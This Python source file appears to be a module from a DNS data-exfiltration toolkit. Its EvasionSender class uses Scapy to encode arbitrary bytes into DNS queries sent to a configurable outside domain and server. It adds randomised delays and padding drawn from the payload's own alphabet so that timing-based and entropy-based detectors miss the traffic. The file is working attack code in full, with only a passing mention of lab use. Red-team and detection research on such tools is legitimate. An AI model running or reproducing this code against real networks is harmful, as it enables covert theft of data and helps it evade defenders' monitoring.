# Evasion DNS sender.
# Variant of DNSSender that applies randomised inter-query delays and
# subdomain padding to reduce the effectiveness of timing-based and
# entropy-based detection.

from __future__ import annotations

import logging
import random
import time
from dataclasses import dataclass, field

from scapy.all import DNS, DNSQR, IP, UDP, send

from exfil.config import ExfilConfig
from exfil.encoder import DNSExfilEncoder

logger = logging.getLogger(__name__)


@dataclass
class EvasionConfig:
    """Configuration for the evasion sender's timing and padding behaviour.

    Attributes:
        min_delay: Minimum seconds between queries. Must be >= 0.
        max_delay: Maximum seconds between queries. Must be >= min_delay.
        padding_chars: Count of random characters appended to each encoded
            chunk before transmission. Characters are drawn from the alphabet
            of the active ``ExfilConfig.encoding`` so padding blends with payload
            symbols. Set to 0 to disable padding.
        seed: Optional random seed for reproducible test runs. None means
            the RNG is not seeded (default behaviour).
    """

    min_delay: float = 0.5
    max_delay: float = 3.0
    padding_chars: int = 4
    seed: int | None = None


@dataclass
class EvasionResult:
    """Statistics returned after a complete evasion exfiltration session.

    Attributes:
        chunks_sent: Number of data DNS queries sent (excludes terminator).
        bytes_encoded: Original payload size in bytes.
        total_queries: chunks_sent + 1 (terminator included).
        elapsed_seconds: Wall time from first to last send() call.
        queries_per_second: total_queries / elapsed_seconds; 0.0 if elapsed is 0.
        target_domain: config.target_domain used for this session.
        dns_server: config.dns_server used for this session.
        avg_delay_seconds: Mean inter-query delay actually used.
        errors: Per-query error messages for any send() failures.
    """

    chunks_sent: int
    bytes_encoded: int
    total_queries: int
    elapsed_seconds: float
    queries_per_second: float
    target_domain: str
    dns_server: str
    avg_delay_seconds: float
    errors: list[str] = field(default_factory=list)


class EvasionSender:
    """DNS exfiltration sender with timing randomisation and subdomain padding.

    Evasion techniques applied:

    - Randomised inter-query delay: each sleep duration is drawn from
      uniform(min_delay, max_delay), breaking the regular timing signal
      that beacon detectors rely on.
    - Subdomain padding: random characters from the payload encoding's
      alphabet are appended to each encoded chunk before transmission.
    - Padding is applied on the wire only; ``DNSExfilEncoder.decode()`` cannot
      strip it. Intended for controlled lab traffic against passive receivers
      that strip non-alphabet characters during reconstruction.

    Args:
        exfil_config: ExfilConfig controlling domain, DNS server, chunk size.
        evasion_config: EvasionConfig controlling timing and padding parameters.
    """

    def __init__(self, exfil_config: ExfilConfig, evasion_config: EvasionConfig) -> None:
        self.exfil_config = exfil_config
        self.evasion_config = evasion_config

    def _pad_label(self, chunk: str) -> str:
        """Append padding characters drawn from the encoding's own alphabet.

        Padding characters are drawn from the encoding-appropriate character set
        so they cannot be distinguished from valid payload characters by alphabet
        analysis alone.

        Args:
            chunk: The encoded chunk string to pad.

        Returns:
            Padded chunk. If padding_chars is 0, returns chunk unchanged.
        """
        if self.evasion_config.padding_chars == 0:
            return chunk
        encoding = self.exfil_config.encoding
        if encoding == "hex":
            alphabet = "0123456789abcdef"
        elif encoding == "base32":
            alphabet = "abcdefghijklmnopqrstuvwxyz234567"
        else:  # base64
            alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
        padding = "".join(
            random.choices(alphabet, k=self.evasion_config.padding_chars)
        )
        return chunk + padding

    def send_query(self, fqdn: str) -> bool:
        """Craft and send a single DNS A-record query using Scapy.

        Packet structure:
        IP(dst=dns_server) / UDP(sport=src_port, dport=dns_server_port) /
        DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))

        Uses send(verbose=0). Returns True on success, False on exception.
        Failures are logged at WARNING level.

        Args:
            fqdn: Fully-qualified domain name to query.

        Returns:
            True if the packet was sent without exception, False otherwise.
        """
        packet = (
            IP(dst=self.exfil_config.dns_server)
            / UDP(sport=self.exfil_config.src_port, dport=self.exfil_config.dns_server_port)
            / DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))
        )
        try:
            send(packet, verbose=0)
            return True
        except Exception as exc:
            logger.warning("send_query failed for %s: %s", fqdn, exc)
            return False

    def exfiltrate(self, data: bytes) -> EvasionResult:
        """Encode data and transmit queries with randomised timing and padded labels.

        Each encoded chunk is padded per ``EvasionConfig`` using the active
        encoding's alphabet. Inter-query delays are drawn independently from
        ``uniform(min_delay, max_delay)``. The terminator label (``done``) is
        never padded. Delays are applied between queries only, not after the
        final query.

        Args:
            data: Raw bytes to send. Empty input returns a zero ``EvasionResult``
                with no queries sent.

        Returns:
            EvasionResult with transmission statistics including avg_delay_seconds.
        """
        if not data:
            return EvasionResult(
                chunks_sent=0,
                bytes_encoded=0,
                total_queries=0,
                elapsed_seconds=0.0,
                queries_per_second=0.0,
                target_domain=self.exfil_config.target_domain,
                dns_server=self.exfil_config.dns_server,
                avg_delay_seconds=0.0,
            )

        if self.evasion_config.seed is not None:
            random.seed(self.evasion_config.seed)

        encoder = DNSExfilEncoder(
            target_domain=self.exfil_config.target_domain,
            chunk_size=self.exfil_config.chunk_size,
            encoding=self.exfil_config.encoding,
        )
        encode_result = encoder.encode(data)
        fqdns = encode_result.fqdns
        total = len(fqdns)
        errors: list[str] = []
        delays: list[float] = []

        start = time.monotonic()

        for i, fqdn in enumerate(fqdns):
            label = fqdn.split(".")[0]
            if label != "done":
                label_parts = label.split("_", 2)
                if len(label_parts) == 3:
                    seq_part, tag_part, chunk_part = label_parts
                    padded_chunk = self._pad_label(chunk_part)
                    label = f"{seq_part}_{tag_part}_{padded_chunk}"
                else:
                    label = self._pad_label(label)
            padded_fqdn = f"{label}.{self.exfil_config.target_domain}"

            delay = random.uniform(
                self.evasion_config.min_delay, self.evasion_config.max_delay
            )
            logger.debug(
                "evasion query %d/%d: %s (delay=%.3fs)", i + 1, total, padded_fqdn, delay
            )

            success = self.send_query(padded_fqdn)
            if not success:
                errors.append(f"query failed: {padded_fqdn}")

            if i < total - 1:
                delays.append(delay)
                time.sleep(delay)

        elapsed = time.monotonic() - start
        qps = total / elapsed if elapsed > 0 else 0.0
        avg_delay = sum(delays) / len(delays) if delays else 0.0

        logger.info(
            "evasion complete: %d queries, %d bytes, %.2fs, avg_delay=%.3fs",
            total,
            encode_result.encoded_bytes,
            elapsed,
            avg_delay,
        )

        return EvasionResult(
            chunks_sent=encode_result.chunk_count,
            bytes_encoded=encode_result.encoded_bytes,
            total_queries=total,
            elapsed_seconds=elapsed,
            queries_per_second=qps,
            target_domain=self.exfil_config.target_domain,
            dns_server=self.exfil_config.dns_server,
            avg_delay_seconds=avg_delay,
            errors=errors,
        )
